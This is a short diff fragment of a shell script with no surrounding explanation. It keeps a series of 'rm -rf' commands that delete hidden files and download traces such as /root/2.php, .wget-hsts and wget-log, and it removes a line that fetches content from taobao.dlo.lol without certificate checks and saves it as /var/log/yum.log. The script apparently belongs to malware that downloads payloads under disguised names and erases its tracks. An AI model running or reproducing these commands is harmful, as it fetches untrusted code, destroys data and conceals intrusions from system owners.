@@ -7,4 +7,3 @@ rm -rf  /var/tmp/.cache_hsperfdata
 rm -rf /var/tmp/.syslog
 rm -rf /usr/.123 /usr/lib/.libc-K8*
 rm -rf /root/.wget-hsts ~/.wget-hsts /tmp/.hypre ~/wget-log* /var/tmp/.cache_hsperfdata /root/2.php
-wget -T 3 -t 1 --no-check-certificate http://taobao.dlo.lol/up.json -O /var/log/yum.log
